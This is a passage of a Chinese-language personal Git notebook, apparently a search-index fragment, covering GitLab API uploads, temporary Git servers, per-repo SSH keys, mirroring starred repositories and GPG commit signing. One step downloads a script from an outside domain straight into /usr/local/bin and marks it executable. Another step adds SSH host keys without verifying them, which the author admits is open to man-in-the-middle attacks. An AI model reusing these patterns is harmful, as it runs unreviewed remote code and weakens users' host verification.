\u5199\u70b9\u4ee3\u7801\u54af\uff1a\u4e0a\u4f20\u5f53\u524d\u76ee\u5f55\u7684to_upload.jpg\u5230uploaded.jpg\uff0c\u8bb0\u5f97\u76f8\u5e94\u4fee\u6539\u4f60\u7684\u8bbf\u95ee\u4ee4\u724c\u548c\u9879\u76eeID TOKEN = '...' # personal access token, https://gitlab.com/profile/personal_access_tokens REPO_ID = 123456 # after create project, you can see project ID in your repo homepage message = 'test commit' target_filename = 'uploaded.jpg' src_filename = 'to_upload.jpg' import gitlab import base64 gl = gitlab . Gitlab ( 'https://gitlab.com' , private_token = TOKEN ) gl . auth () p = gl . projects . get ( REPO_ID ) filecontent = open ( src_filename , 'rb' ) . read () data = { 'branch_name' : 'master' , 'branch' : 'master' , 'commit_message' : message , 'actions' :[{ 'action' : 'create' , 'file_path' : target_filename , 'content' : base64 . b64encode ( filecontent ) . decode (), 'encoding' : 'base64' }] } c = p . commits . create ( data ) print ( c ) \u5728git\u670d\u52a1\u5668\u65e0\u6cd5\u8fde\u63a5\u65f6\u70b9\u5bf9\u70b9git pull \u00b6 \u60c5\u666f\uff1a\u5ba2\u6237\u7aefA\u548cB\u4f7f\u7528gitlab\u670d\u52a1\u5668S\uff0c\u7136\u540e\u67d0\u5929S\u65e0\u6cd5\u8fde\u4e0a\u4e86\uff0c\u4f46A\u548cB\u4e4b\u95f4\u53ef\u4ee5\u76f4\u63a5\u901a\u8baf\u3002B\u4e0a\u5f00\u53d1\u4e86\u65b0\u4ee3\u7801\uff0c\u60f3\u8ba9A\u83b7\u53d6\u5230\u8fd9\u4e2a\u66f4\u65b0\uff0c\u5982\u4f55\u6700\u65b9\u4fbf\u7b80\u5355\u5730\u5728A\u4e0a\u540c\u6b65B\u4e0a\u7684\u4ee3\u7801\u66f4\u65b0\u5462\uff1f \u89e3\u51b3\u65b9\u6848\uff1a\u7528python\u5f00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668\u7136\u540e\u6dfb\u52a0http\u7684remote\u8fdb\u884cpull\uff0c\u6ce8\u610f\u5148\u8981\u8ba9git\u89e3\u538bpack\u6587\u4ef6 git update-server-info python3 -m http.server 6666 git remote add tmp http://ip-b:6666/.git/ git pull tmp master \u95ee\u9898\u6765\u4e86\uff1a\u5982\u679cA\u8bbf\u95ee\u4e0d\u4e86B\u600e\u4e48\u529e\u5462\uff1f\u901a\u8fc7 git format-patch HEAD~2..HEAD --stdout>patchfile \u751f\u6210patch\u6587\u4ef6\u518d\u53d1\u8fc7\u53bb git am patchfile \uff0c\u4f46\u8fd9\u6837\u53ef\u80fd\u4f1a\u6539\u53d8commit id git\u7981\u7528\u538b\u7f29 \u00b6 \u5982\u4e8c\u8fdb\u5236\u7684\u4ed3\u5e93\u4e0d\u60f3\u4f7f\u7528\u538b\u7f29\uff0c\u53c2\u8003: https://stackoverflow.com/questions/11483288/how-to-disable-compression-in-git-server-side git config --add core.bigFileThreshold 1 GitHub\u4e0d\u540c\u4ed3\u5e93\u4f7f\u7528\u4e0d\u540cssh key: ghclone \u00b6 GitHub\u8981\u6c42\u4e0d\u540c\u4ed3\u5e93\u7684deploy key\u4e0d\u540c\uff0c\u4f46ssh config\u53ea\u80fd\u4e3a\u4e00\u4e2aHost\u8bbe\u7f6e\u76f8\u540c\u7684key \u4ece \u8fd9\u91cc \u53d1\u73b0\u4e86\u4e00\u4e2atrick\uff1a *.github.com \u90fd\u662f\u53ef\u4ee5\u6b63\u5e38\u89e3\u6790\u5230github\u7684\uff0c\u8fd9\u6837\u5c31\u5f97\u5230\u4e86\u65e0\u6570\u4e2aHost \u5feb\u901f\u4f7f\u7528\uff1a curl https://d.py3.io/ghclone > /usr/local/bin/ghclone chmod +x /usr/local/bin/ghclone ghclone user/repo \u4f1a\u4e3a\u8fd9\u4e2arepo\u521b\u5efa\u4e00\u4e2assh key\u653e\u5728 ~/.ssh \u76ee\u5f55\u4e0b\uff0c\u540c\u65f6\u4fee\u6539 ~/.ssh/config \uff0c\u7136\u540e\u663e\u793a\u51fa\u516c\u94a5\uff0c\u9700\u8981\u624b\u52a8\u6dfb\u52a0\u5230github\uff0c\u6700\u540e\u56de\u8f66\u5c31\u4f1a\u5f00\u59cbgit clone Done. \u5982\u679c\u662f\u4e00\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u4ed3\u5e93\uff0c\u6700\u540e\u4e00\u6b65\u4e0d\u7528\u56de\u8f66Ctrl+C\u540e: git remote set-url origin git@{repo}.github.com:{user}/{repo}.git \u542f\u52a8\u4e00\u4e2a\u4e34\u65f6\u7684Git\u670d\u52a1\u5668 \u672c\u5730\u4e4b\u95f4\u540c\u6b65 \u00b6 \u573a\u666f\uff1a GitLab\u670d\u52a1\u5668\u5b95\u673a\u4e86\uff0c\u73b0\u5728\u9700\u8981\u540c\u6b65\u81ea\u5df1\u672c\u5730\u7684\u4fee\u6539\u5230\u670d\u52a1\u5668\u4e0a \u53c2\u8003\uff1a https://datagrok.org/git/git-serve/ # \u81ea\u5df1\u673a\u5668\u4e0a\uff08\u6709\u66f4\u591acommit\u7684\uff09 git config -- global alias . quickserve \"daemon --verbose --export-all --base-path=.git --reuseaddr --strict-paths .git/\" git quickserve # \u670d\u52a1\u5668\u4e0a\uff08\u9700\u8981pull\u5f97\u5230commit\u7684\uff09 git remote add temp git : // 192.168 . 1.123 / git pull temp master \u540c\u6b65\u5b8c\u6210\u540e\u5c31\u53ef\u4ee5Ctrl+C\u5173\u95edgit\u670d\u52a1\u4e86 Note git\u672b\u5c3e\u7684/\u4e0d\u53ef\u7f3a\u7701\uff0c\u4e0d\u7136\u62a5\u9519fatal: No path specified. See \u2018man git-pull\u2019 for valid url syntax git pull\u7684\u5206\u652f\u540d\u79f0master\u4e5f\u4e0d\u80fd\u7701\u7565 \u5907\u4efdGitHub\u4e0a\u81ea\u5df1star\u8fc7\u7684\u4ed3\u5e93 \u00b6 \u81ea\u4eceGitHub\u88ab\u5fae\u8f6f\u6536\u8d2d\u540e\uff0c\u4f3c\u4e4e\u5c31\u5d29\u5f97\u66f4\u9891\u7e41\u4e86\uff0c\u4e3a\u4e86\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4ecd\u7136\u80fd\u8bfb\u4ee3\u7801\uff0c\u4e0d\u59a8\u8dd1\u4e00\u4e0b\u5b9a\u65f6\u811a\u672c\uff0c\u81ea\u52a8pull\u6307\u5b9a\u4ed3\u5e93push\u5230\u5176\u4ed6git\u670d\u52a1\u4e0a\uff08\u5982\u81ea\u884c\u90e8\u7f72gitea\uff09\u3002 \u83b7\u53d6\u81ea\u5df1star\u8fc7\u7684\u6240\u6709\u4ed3\u5e93\uff1a\uff08\u4f9d\u8d56 apt install -y jq \uff09 for i in ` seq 28 ` ; do curl \"https://api.github.com/users/zjuchenyuan/starred?page= ${ i } \" > ${ i } .tmp ; done cat *.tmp | jq '.[].full_name' -r > mystars.txt sync.sh: \u4ecegithub clone\u6216fetch\u5bf9\u5e94\u7684\u4ed3\u5e93\uff0c\u7136\u540epush\u5230\u81ea\u5df1\u7684git\u670d\u52a1\u4e0a\uff0c\u8fd9\u91cc\u4f7f\u7528bare\u907f\u514dcheckout\u5bfc\u81f4\u7684\u66f4\u591a\u7a7a\u95f4\u5360\u7528 TODO: \u6ce8\u610f\u5230\u4ecd\u7136\u662f\u53cc\u4efd\u7684\u7a7a\u95f4\u5360\u7528\uff08\u540c\u6b65\u548cgitea\u90fd\u5b58\u4e86\uff09\uff0c\u9700\u8981\u770b\u770b\u80fd\u4e0d\u80fd\u76f4\u63a5\u4ecegitea\u7684git\u5b58\u50a8\u53d1\u8d77fetch\u66f4\u65b0 #!/bin/bash u = ` echo ${ 1 } | cut -d/ -f1 ` n = ` echo ${ 1 } | cut -d/ -f2 ` if [ -z \" $u \" ] || [ -z \" $n \" ] ; then echo Usage: $0 user/reponame exit 1 fi if [ -d \" ${ u } _ ${ n } \" ] ; then cd \" ${ u } _ ${ n } \" git fetch --all git push --all sync else git clone https://github.com/ ${ u } / ${ n } \" ${ u } _ ${ n } \" --bare cd \" ${ u } _ ${ n } \" git fetch --all git remote add sync git@\u4f60\u7684git\u670d\u52a1\u5730\u5740:\u4f60\u7684\u7528\u6237\u540d/ ${ u } _ ${ n } .git git push --all sync fi cd .. git clone\u548cpush\u907f\u514d\u8f93\u5165ssh\u8be2\u95ee\u7684yes \u00b6 mkdir -p ~/.ssh ssh-keyscan \u4f60\u7684git\u670d\u52a1\u5730\u5740 >> ~/.ssh/known_host Note \u8fd9\u4e2a\u65b9\u6848\u5e76\u4e0d\u5b89\u5168\uff0c\u5bb9\u6613\u906d\u53d7\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u4f60\u5e94\u8be5\u4e8b\u5148\u5728\u5b89\u5168\u7684\u7f51\u7edc\u4e0b\u83b7\u53d6\u6b63\u786e\u7684ssh key\u540e\u76f4\u63a5\u5c06\u6307\u7eb9\u5199\u5165known_host\u3002 \u4e0d\u8fc7\u5c31\u7b97\u4e0d\u81ea\u52a8\u5316\u4f60\u4e5f\u4f1a\u81ea\u5df1\u56de\u7b54yes\uff0c\u672c\u8d28\u4e0a\u4e00\u6837hhh \u90e8\u7f72gitea \u00b6 https://hub.docker.com/r/gitea/gitea \u6309\u7167\u5b98\u65b9\u7ed9\u51fa\u7684docker-compose\u90e8\u7f72\u5373\u53ef\uff0c\u5b89\u88c5\u65f6\u9700\u8981\u7559\u5fc3\uff1asmtp\u7684host\u9700\u8981\u5305\u542b\u7aef\u53e3\uff0c\u767b\u5f55\u7528\u6237\u540d\u662f\u5b8c\u6574\u7684\u90ae\u7bb1 \u7136\u540e\u9700\u8981\u4fee\u6539\u914d\u7f6e\uff0c\u5141\u8bb8\u7528\u6237\u5728push\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u4ed3\u5e93\u65f6\u81ea\u52a8\u521b\u5efa\uff0c\u53c2\u89c1 \u8fd9\u4e2aissue \u548c conf\u914d\u7f6e\u6587\u6863 \u9700\u8981\u5728app.ini\u7684 [repository] \u4e00\u8282\u4e2d\u52a0\u5165\uff1a ENABLE_PUSH_CREATE_USER = true ENABLE_PUSH_CREATE_ORG = true \u5c0f\u5fc3git bomb \u5b9e\u9645\u6d4b\u8bd5\u53d1\u73b0 \u5bf9 git bomb \u8fd9\u79cd\u4ed3\u5e93 checkout\u5c31\u4f1a\u5360\u6ee1\u5168\u90e8\u5185\u5b58 \u5373\u4f7f\u4f7f\u7528\u4e0a\u8ff0\u811a\u672c\u53ea\u540c\u6b65bare\u4ed3\u5e93\uff0cgitea\u4f1a\u542f\u52a8git show\u547d\u4ee4\uff0c\u4ecd\u7136\u4f1a\u70b8\u5185\u5b58\uff08\u4f46\u4f3c\u4e4ekill\u6389\u8fd9\u4e2a\u547d\u4ee4\u540e\u7f51\u9875\u663e\u793a\u4e5f\u662f\u6b63\u5e38\u7684\uff09 Git\u67e5\u8be2\u7279\u5b9acommit\u65f6\u95f4 \u00b6 https://stackoverflow.com/questions/3814926/git-commit-date \u83b7\u53d6\u65f6\u95f4\u6233\uff1a git show -s --format=%ct COMMIT_ID GitHub\u67e5\u8be2\u6240\u6709releases \u00b6 https://docs.github.com/en/rest/reference/repos#releases https://api.github.com/repos/octocat/hello-world/releases?per_page=100&page=1 git diff\u663e\u793a\u4fee\u6539\u540e\u884c\u53f7 \u00b6 \u53c2\u8003\uff1a https://stackoverflow.com/questions/8259851/using-git-diff-how-can-i-get-added-and-modified-lines-numbers diff-lines() { local path= local line= while read; do esc=$'\\033' if [[ $REPLY =~ ---\\ (a/)?.* ]]; then continue elif [[ $REPLY =~ \\+\\+\\+\\ (b/)?([^[:blank:] $esc ]+).* ]]; then path= ${ BASH_REMATCH [ 2 ] } elif [[ $REPLY =~ @@\\ -[0-9]+(,[0-9]+)?\\ \\+([0-9]+)(,[0-9]+)?\\ @@.* ]]; then line= ${ BASH_REMATCH [ 2 ] } elif [[ $REPLY =~ ^( $esc \\[[0-9;]+m)*([\\ +-]) ]]; then echo \" $path : $line : $REPLY \" if [[ ${ BASH_REMATCH [ 2 ] } != - ]]; then ((line++)) fi fi done } \u7528\u6cd5\uff1a git diff commit^ commit -U0|diff-lines","title":"Git"},{"location":"Git/#git","text":"\u53c2\u8003 \u6c89\u6d78\u5f0f\u5b66 Git http://igit.linuxtoy.org/ \u53c2\u8003 Learn Git Branching learngitbranching.js.org","title":"Git"},{"location":"Git/#_1","text":"\u5728\u7f51\u9875\u4e0a\u5148\u521b\u5efa\u4e86\u4ed3\u5e93\uff0c\u8bbe\u7f6e\u597d.gitignore git clone github\u63d0\u4f9b\u7684\u5730\u5740 ( \u7528ssh\u7684 ) # \u73b0\u5728\u521b\u5efa\u4e86\u4f60\u7684\u4ed3\u5e93\u6587\u4ef6\u5939\uff0c\u5c06\u9700\u8981\u4e0a\u4f20\u7684\u6587\u4ef6\u653e\u8fdb\u53bb cd \u4f60\u7684\u4ed3\u5e93\u540d\u79f0 git add . git commit -a -m \"\u8fd9\u6b21\u6539\u4e86\u4e9b\u5565\uff1f\" git push \u66f4\u591a\u7684\u914d\u7f6e\uff1a # \u9ed8\u8ba4git pull --rebase git config --global pull.rebase true","title":"\u7acb\u5373\u4f7f\u7528"},{"location":"Git/#git-clone","text":"\u65b9\u6cd51\uff1a\u914d\u7f6e\u4e00\u4e2a\u4ee3\u7406(\u5982privoxy)\uff0c\u5e76\u4f7f\u7528https\u5730\u5740 \u65b9\u6cd52\uff1a\u4f7f\u7528 --depth 1 \u53c2\u6570\u8868\u793a\u4e0d\u8981\u590d\u5236\u5386\u53f2 export https_proxy = \"http://127.0.0.1:8118\" git clone -- depth 1 https : // github . com / zjuchenyuan / notebook","title":"\u52a0\u901fgit clone"},{"location":"Git/#git-push","text":"\u4ee3\u7801\u53c2\u89c1 code/ssgit.txt","title":"git push\u52a0\u901f"},{"location":"Git/#git-push_1","text":"\u53c2\u7167http://blog.csdn.net/chfe007/article/details/43388041 \u9996\u5148\u751f\u6210\u81ea\u5df1\u7684ssh\u5bc6\u94a5\uff0c\u4e0d\u8981\u4fee\u6539\u751f\u6210\u7684\u6587\u4ef6\u4f4d\u7f6e ssh-keygen -t rsa -b 4096 \u7136\u540e\u628a ~/.ssh/id_rsa.pub \u7684\u5185\u5bb9\u8bbe\u7f6e\u5230github\u4e2d\uff0c \u7f51\u9875\u7aef\u64cd\u4f5c \uff1b\u5efa\u8bae\u987a\u5e26\u542f\u7528\u4e24\u6b65\u9a8c\u8bc1 \u65b0\u624b\u8fd8\u544a\u8bc9git\u81ea\u5df1\u662f\u8c01\uff1a git config --global user.email \"\u4f60\u7684\u90ae\u7bb1\" git config --global user.name \"\u4f60\u7684\u7528\u6237\u540d\" \u5982\u679c\u5f53\u524d\u4ed3\u5e93\u662fhttps\u7684\uff0c\u6539\u4e3agit\u65b9\u5f0f\uff1a git remote set-url origin git@github.com:\u7528\u6237\u540d/\u4ed3\u5e93\u540d\u79f0.git","title":"git push\u514d\u5bc6\u7801"},{"location":"Git/#bash","text":"\u901a\u8fc7\u4fee\u6539~/.bashrc\u6765\u8bbe\u7f6e\u522b\u540d\uff0c\u8ba9git\u7684\u65e5\u5e38\u4f7f\u7528\u66f4\u7b80\u5355\uff1a func_g(){ git add . git commit -a -m \"$1\" git push } alias g=func_g alias gs='git status ' alias ga='git add ' alias gb='git branch ' alias gc='git commit' alias gd='git diff' alias go='git checkout ' alias gp='git push' alias gl=\"git log --all --pretty=format:'%h %ad | %s%d [%an]' --graph --date=short\" \u5b8c\u6210\u4e00\u6b21\u63d0\u4ea4\uff0c\u73b0\u5728\u53ea\u9700\u8981 g \"\u63d0\u4ea4\u4fe1\u606f\" \u8981\u7acb\u5373\u751f\u6548\uff0c\u53ef\u4ee5\u6267\u884c source ~/.bashrc","title":"bash\u522b\u540d\u8bbe\u7f6e"},{"location":"Git/#bashdirty","text":"\u6b64\u90e8\u5206\u5185\u5bb9\u6765\u81eaUdacity \u5982\u4f55\u4f7f\u7528 Git \u548c GitHub \u8bfe\u7a0b \u4e0b\u8f7d\u9700\u8981\u7684\u6587\u4ef6 curl -O https://raw.githubusercontent.com/git/git/master/contrib/completion/git-completion.bash curl -O https://raw.githubusercontent.com/git/git/master/contrib/completion/git-prompt.sh \u5728 ~/.bashrc \u672b\u5c3e\u6dfb\u52a0\uff1a source ~/ git - completion . bash green = \"\\[ \\033 [0;32m\\]\" blue = \"\\[ \\033 [0;34m\\]\" purple = \"\\[ \\033 [0;35m\\]\" reset = \"\\[ \\033 [0m\\]\" source ~/ git - prompt . sh export GIT_PS1_SHOWDIRTYSTATE = 1 export PS1 = \"$purple\\u$green\\$(__git_ps1) \\w \\a $ $reset\" \u6548\u679c\u5982\u56fe\uff0c\u5982\u679c\u51fa\u73b0\u4e86\u672a\u63d0\u4ea4\u7684\u4fee\u6539\uff0c\u4f1a\u81ea\u52a8\u663e\u793a\u51fa*\u8868\u793adirty\uff1a","title":"\u8bbe\u7f6ebash\u4e2d\u7684\u81ea\u52a8\u5b8c\u6210\u4e0edirty\u63d0\u793a"},{"location":"Git/#_2","text":"","title":"\u597d\u73a9\u7684\u547d\u4ee4\u4eec"},{"location":"Git/#git-status","text":"\u67e5\u770b\u72b6\u6001\u54af~","title":"git status"},{"location":"Git/#git-reset","text":"\u5df2\u7ecf git add \u4e86\uff0c\u60f3\u53d6\u6d88\u8fd9\u4e00\u6b65\u5c31\u7528 git reset","title":"git reset"},{"location":"Git/#git-checkout","text":"\u554a\u3002\u3002\u3002\u4ee3\u7801\u641e\u574f\u4e86\u6211\u8981\u56de\u6eda\u5230\u4e0a\u6b21commit\uff0c\u7528 git checkout -- \u6587\u4ef6\u540d","title":"git checkout"},{"location":"Git/#git-reset-soft","text":"\u64a4\u9500\u5230\u67d0\u6b21commit\uff0c\u4f46\u4e0d\u5220\u9664\u65b0\u589e\u6587\u4ef6 \u5176\u4e2dcommit_id\u53ef\u4ee5\u4ece git log \u83b7\u5f97","title":"git reset --soft "},{"location":"Git/#git-reset-hard","text":"git\u7684\u5386\u53f2\u662f\u4e0d\u80fd\u7528\u547d\u4ee4\u4fee\u6539\u7684\uff0c\u4e22\u5931\u7684commit\u7528reflog\u53ef\u4ee5\u627e\u56de\uff0c\u9664\u975egit\u5df2\u7ecf\u628a\u5b83\u5f53\u6210\u5783\u573e\u5220\u9664\uff0830\u5929\uff09 git stash save git reflog # \u67e5\u770b\u4e22\u5931\u7684\u90a3\u4e2acommit\u7684id git checkout \u90a3\u4e2acommitid git branch recover # \u521b\u5efarecover\u5206\u652f git checkout master # \u56de\u5230master git merge recover # \u5408\u5e76recover\u5230master git branch -d recover # \u5408\u5e76\u5b8c\u6210\u540e\u5c31\u53ef\u4ee5\u5220\u4e86","title":"\u6062\u590dgit reset --hard\u5220\u9664\u7684\u6587\u4ef6"},{"location":"Git/#_3","text":"\u4e3a\u5565\u8981 git add \u5462? \u56e0\u4e3a\u6709\u4e9b\u65f6\u5019\u4e24\u4e2a\u6587\u4ef6\u53ef\u80fd\u662f\u4e0d\u76f8\u5173\u7684\u4fee\u6539\uff0c\u5e94\u8be5\u5206\u522b\u63d0\u4ea4\u4e24\u6b21 \u901a\u8fc7\u5206\u5f00\u6682\u5b58\u548c\u63d0\u4ea4\uff0c\u4f60\u80fd\u591f\u66f4\u52a0\u5bb9\u6613\u5730\u8c03\u4f18\u6bcf\u4e00\u4e2a\u63d0\u4ea4\u3002 \u4e3a\u5565\u4e0d\u6539.profile\u800c\u662f\u6539.bashrc\u5462 \u56e0\u4e3awin10\u4e2d\u53ea\u8981\u6709\u4e00\u4e2abash\u7a97\u53e3\u6ca1\u5173\u6389\uff0c\u542f\u52a8bash\u5c31\u4e0d\u662f\u767b\u5f55\uff0c\u800c\u662f\u76f8\u5f53\u4e8e\u518d\u5f00\u4e86\u4e2a docker exec -i -t bashonwin10 /bin/bash \u6b64\u65f6\u662f\u4e0d\u4f1a\u6267\u884c\u767b\u5f55\u811a\u672c.profile\u7684\uff0c\u4f46\u662f.bashrc\u8fd8\u662f\u4f1a\u6267\u884c\u7684","title":"\u4f60\u53ef\u80fd\u4f1a\u95ee\u7684\u4e00\u4e9b\u95ee\u9898"},{"location":"Git/#git_1","text":"Learned from githug","title":"Git\u5404\u79cd\u60c5\u666f"},{"location":"Git/#aliba","text":"\u6587\u6863\u67e5\u770b\uff1a git gitignore --help !\u8868\u793a\u8d1f\u5411\u9009\u62e9\uff0c\u5728.gitignore\u4e2d\u6dfb\u52a0\uff1a * . a !lib.a","title":"\u5ffd\u7565*.a\u6587\u4ef6\u4f46\u4e0d\u60f3\u5ffd\u7565lib.a"},{"location":"Git/#commit","text":"\u5982\u679c\u53d1\u73b0\u4e0a\u6b21commit\u6f0f\u4e86\u6587\u4ef6\uff0c\u4e0d\u5e94\u8be5\u65b0\u52a0commit\u800c\u662f\u5e94\u8be5\u7528amend\uff0c\u5426\u5219\u53ef\u80fd\u4e0aCI\u5c31\u6302 git add forgotten.txt git commit --amend","title":"commit\u8865\u4e0a\u5fd8\u6389\u7684\u6587\u4ef6"},{"location":"Git/#_4","text":"github\u63d0\u4f9b\u7684blame\u529f\u80fd\u66f4\u597d\u770b\uff0c\u663e\u793a\u6bcf\u884c\u4ee3\u7801\u7684\u4f5c\u8005\u548c\u6765\u6e90\u4e8e\u54ea\u6b21commit git blame filename","title":"\u67e5\u51fa\u6b64\u884c\u4ee3\u7801\u7684\u6700\u540e\u4fee\u6539\u8005"},{"location":"Git/#commit_1","text":"\u8ba9\u6bcf\u6b21commit\u4fdd\u6301\u5728\u6bd4\u8f83\u5c0f\u7684\u6539\u52a8\uff0c\u4e0d\u8981\u5728\u4e00\u4e2acommit\u4e2d\u51fa\u73b0\u4e24\u4e2a\u4e0d\u90a3\u4e48\u76f8\u5173\u7684\u4fee\u6539 \u672c\u77e5\u8bc6\u5b66\u4e60\u81ea\uff1a 10 \u4e2a\u8fc5\u901f\u63d0\u5347\u4f60 Git \u6c34\u5e73\u7684\u63d0\u793a \u65b9\u6cd5\u662f\u5728add\u7684\u65f6\u5019\u7ed9\u51fa\u53c2\u6570-p \u7136\u540egit\u4f1a\u5728\u6bcf\u4e00\u4e2a\u4fee\u6539\u7684block\u8be2\u95ee\u662f\u5426\u52a0\u5165\u8fd9\u6b21\u7684commit\uff0c\u56de\u7b54y\u8868\u793a\u52a0\u5165\uff0cn\u8868\u793a\u4e0d\u52a0\u5165\uff0cs\u8868\u793a\u8fdb\u4e00\u6b65\u62c6\u5206\u8fd9\u4e2ablock \u5b8c\u6210\u597d\u9009\u62e9\u540e\uff0c\u4f7f\u7528 git diff --staged \u547d\u4ee4\u6765\u67e5\u8be2\u6682\u5b58\u7684\u4fee\u6539\uff0c\u6ca1\u6709\u95ee\u9898\u5c31\u53ef\u4ee5\u7ee7\u7eed git commit \u5566","title":"\u6587\u4ef6\u4e00\u6b21\u6027\u6539\u592a\u591a\u4e86\uff0c\u62c6\u6210\u591a\u6b21commit"},{"location":"Git/#_5","text":"\u539f\u6587\uff1a http://stackoverflow.com/questions/1753070/git-ignore-files-only-locally \u6709\u65f6\u5019\u6211\u4eec\u4e0d\u60f3\u8ba9git\u8ffd\u8e2a\u4e00\u4e9b\u4e2a\u4eba\u76f8\u5173\u7684\u6587\u4ef6\uff0c\u4f8b\u5982config\u4e2d\u4fee\u6539Debug=True\uff0c\u6b64\u65f6\u5982\u679c\u53bb\u4fee\u6539.gitignore\u9020\u6210\u7684\u5f71\u54cd\u662f\u5168\u5c40\u7684\uff0c\u5e76\u4e14\u9700\u8981\u4ecegit\u4e2d\u5220\u9664\u8fd9\u4e2a\u6587\u4ef6\uff1b\u624b\u52a8\u907f\u5f00add config\u5f88\u70e6\uff0c\u6709\u6ca1\u6709\u66f4\u597d\u7684\u65b9\u6cd5\uff0c\u8ba9git\u5ffd\u7565\u6389config\u6587\u4ef6\u7684\u4fee\u6539\u5462\uff1f \u65b9\u6cd5\u662f\u4fee\u6539 .git/info/exclude \u6587\u4ef6\uff0c\u8fd9\u4e2a\u6587\u4ef6\u7684\u8bed\u6cd5\u89c4\u5219\u4e0e.gitignore\u4e00\u6837 \u5982\u679c\u5df2\u7ecf\u9020\u6210\u4e86\u4fee\u6539\uff0c\u8fd8\u9700\u8981\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a git update-index --assume-unchanged [<file>...]","title":"\u672c\u5730\u5ffd\u7565\u4e00\u4e9b\u4e2a\u4eba\u7684\u4fee\u6539"},{"location":"Git/#branchpushgit-push-u","text":"From: http://stackoverflow.com/questions/2765421/how-do-i-push-a-new-local-branch-to-a-remote-git-repository-and-track-it-too \u6267\u884c\u4e86\u4e00\u4e9b\u4fee\u6539\u5f15\u5165\u65b0\u529f\u80fd\uff0c\u4f46\u8fd8\u4e0d\u80fd\u5de5\u4f5c\uff0c\u51b3\u5b9a\u5efa\u7acb\u4e00\u4e2adev\u5206\u652f\uff1a git checkout -b dev \u73b0\u5728\u518d\u6267\u884c git add \uff0c git commit \u540e\uff0c\u9700\u8981\u628a\u65b0\u7684\u5206\u652fpush\u7ed9\u8fdc\u7a0b\u670d\u52a1\u5668\uff1a git push -u origin dev","title":"\u672c\u5730\u521b\u5efabranch\u540epush\u64cd\u4f5cgit push -u"},{"location":"Git/#gpggit","text":"\u53c2\u8003\uff1ahttps://help.github.com/articles/signing-commits-with-gpg/ \u4e0b\u8ff0\u4ee5ubuntu16.04\uff08\u5176\u5b9e\u662fbash on win10\uff09\u8bb2\u89e3\u6574\u4e2a\u8fc7\u7a0b","title":"\u7528gpg\u7ed9git\u63d0\u4ea4\u7b7e\u540d"},{"location":"Git/#gpg2","text":"\u67e5\u770bgpg\u7248\u672c\uff1a gpg --version \u53d1\u73b0\u7248\u672c\u662f gpg (GnuPG) 1.4.20 \uff0c\u800c\u6559\u7a0b\u8981\u6c42\u89812\u4ee5\u4e0a\uff0c\u6240\u4ee5\u5148\u8981\u5b89\u88c5gpg2\uff0c\u5e76\u544a\u8bc9git\u6211\u4eec\u8981\u4f7f\u7528gpg2\uff1a apt install -y gpg2 git config --global gpg.program gpg2","title":"\u5b89\u88c5gpg2"},{"location":"Git/#key","text":"\u8fd9\u91ccgithub\u7ed9\u51fa\u7684\u547d\u4ee4\u6709\u95ee\u9898\uff0cgoogle\u53d1\u73b0\u53c2\u6570\u6539\u4e86 gpg2 --full-gen-key \u56de\u8f66\u9009\u62e9RSA and RSA\uff0c\u7136\u540e\u8f93\u5165\u5bc6\u94a5\u5927\u5c0f\u8f93\u51654096\uff0c\u7136\u540e\u56de\u8f66\u6c38\u4e0d\u8fc7\u671f\uff0c\u786e\u8ba4y\uff0c\u7136\u540e\u8f93\u5165\u81ea\u5df1\u7684\u540d\u5b57\u548c\u90ae\u7bb1 \u6ce8\u610f\u8fd9\u91cc\u90ae\u7bb1\u8981\u548cgit commit\u7528\u5230\u7684\u90ae\u7bb1\u4e00\u81f4","title":"\u521b\u5efa\u4e00\u4e2a\u65b0\u7684key"},{"location":"Git/#key-github","text":"gpg2 --list-secret-keys --keyid-format LONG \u5982\u4e0b\u8f93\u51fa\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u7684\u662f3AA5C34371567BD2\u8fd9\u4e00\u4e32 \u5c31\u662fsec\u90a3\u4e00\u884c\u76844096R/\u540e\u9762\u7684\u4e1c\u897f $ gpg2 --list-secret-keys --keyid-format LONG /Users/hubot/.gnupg/secring.gpg ------------------------------------ sec 4096R/3AA5C34371567BD2 2016 -03-10 [ expires: 2017 -03-10 ] uid Hubot ssb 4096R/42B317FD4BA89E7A 2016 -03-10 \u7136\u540e\u5f97\u5230\u516c\u94a5\uff1a gpg2 -- armor -- export 3 AA5C34371567BD2 \u590d\u5236\u5c4f\u5e55\u4e0a\u8f93\u51fa\u7684\u4e00\u5927\u4e32\uff0c\u6253\u5f00\u4e0b\u9762\u7684\u7f51\u9875 \u7c98\u8d34\u63d0\u4ea4 https://github.com/settings/gpg/new","title":"\u5bfc\u51fakey\u7684\u516c\u94a5 \u5728github\u8bbe\u7f6e\u4e2d\u63d0\u4ea4"},{"location":"Git/#gitgpg","text":"\u544a\u8bc9git\u9ed8\u8ba4\u4f7f\u7528\u8fd9\u4e2akey\uff1a git config --global user.signingkey 3AA5C34371567BD2 git config --global commit.gpgsign true \u6267\u884c \u5efa\u8bae\u5c06\u8fd9\u4e00\u884c\u5199\u5165~/.bashrc\uff1a export GPG_TTY =$ ( tty ) \u7136\u540e\u5c31\u662f\u6b63\u5e38\u7684git add .\uff0cgit commit -m \u201cmessage\u201d\u54af gpg-agent\u4f1a\u5728\u540e\u53f0\u8fd0\u884c\uff0c\u9ed8\u8ba410\u5206\u949f\u5185\u4e0d\u9700\u8981\u518d\u6b21\u8f93\u5165\u5bc6\u7801","title":"\u914d\u7f6egit\u4f7f\u7528gpg\u7b7e\u540d"},{"location":"Git/#gpg","text":"10\u5206\u949f\u7684\u9ed8\u8ba4\u9650\u5236\u8fd8\u662f\u592a\u77ed\u4e86\uff0c\u5bf9\u4e8e\u5b89\u5168\u6027\u8981\u6c42\u4e0d\u9ad8\u7684\u60c5\u666f\uff08\u6bd4\u5982\u81ea\u5df1\u7684\u5f00\u6e90\u4ee3\u7801push\u5230github\uff09\uff0c\u4e0d\u59a8\u8bbe\u7f6e\u4e3a\u5bc6\u7801\u4e00\u76f4\u6709\u6548\uff0c\u76f4\u5230gpg-agent\u91cd\u542f \u4e0b\u9762\u7684\u8bbe\u7f6e\u5c06\u9650\u5236\u6539\u52301\u5e74\uff0c\u5f53\u7136gpg-agent\u91cd\u542f\u8fd8\u662f\u8981\u518d\u6b21\u8f93\u5165\u5bc6\u7801\u7684\uff1a vi ~/ . 